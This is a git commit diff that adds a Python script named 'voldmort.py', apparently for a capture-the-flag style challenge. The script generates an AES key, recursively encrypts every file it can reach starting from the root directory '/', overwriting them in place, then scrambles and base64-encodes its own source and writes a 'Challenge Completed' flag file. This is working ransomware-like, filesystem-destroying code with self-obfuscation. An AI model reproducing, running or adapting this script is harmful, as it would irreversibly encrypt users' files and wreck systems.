393c8608a358bfe921a67b0bedb536117057bf52
Skywalker-341 <156662493+SkyWalker-341@users.noreply.github.com>
2025-02-05 00:44:16 +0530

    voldmort.py

---
+++ Lord Voldemort/voldmort.py
@@ -0,0 +1,74 @@
+import os
+import sys
+import base64
+import random
+import string
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.padding import PKCS7
+from cryptography.hazmat.backends import default_backend
+from multiprocessing import Process
+
+def generate_key():
+    salt = os.urandom(16)
+    password = os.urandom(16)
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=salt,
+        iterations=100000,
+        backend=default_backend()
+    )
+    key = kdf.derive(password)
+    return key, salt, password
+
+def encrypt_file(file_path, key):
+    with open(file_path, "rb") as f:
+        data = f.read()
+    padder = PKCS7(algorithms.AES.block_size).padder()
+    padded_data = padder.update(data) + padder.finalize()
+    iv = os.urandom(16)
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+    with open(file_path, "wb") as f:
+        f.write(iv + encrypted_data)
+
+def process_files(directory, excluded_files, key):
+    for root, _, files in os.walk(directory):
+        for file in files:
+            if file not in excluded_files:
+                encrypt_file(os.path.join(root, file), key)
+
+def hide_key_file(key_file_path):
+    while True:
+        pass
+
+def reverse_and_obfuscate_script(script_path):
+    with open(script_path, "r") as f:
+        script = f.read()
+    reversed_script = script[::-1]
+    shuffled = list(reversed_script)
+    random.shuffle(shuffled)
+    index_map = {i: shuffled.index(char) for i, char in enumerate(reversed_script)}
+    obfuscated_script = "".join(shuffled)
+    encoded_script = base64.b64encode(obfuscated_script.encode()).decode()
+    with open(script_path, "w") as f:
+        f.write(encoded_script + "-f{" + ",".join(map(str, index_map.values())) + "}")
+
+def main():
+    key, salt, password = generate_key()
+    key_file_path = "keyfile"
+    excluded_files = ["boot", "shell-config", "proc-config", key_file_path, sys.argv[0]]
+    with open(key_file_path, "wb") as f:
+        f.write(key)
+    parent_process = Process(target=hide_key_file, args=(key_file_path,))
+    parent_process.start()
+    process_files("/", excluded_files, key)
+    reverse_and_obfuscate_script(sys.argv[0])
+    with open("/tmp/.flag.txt", "w") as f:
+        f.write("Challenge Completed")
+
+if __name__ == "__main__":
+    main()
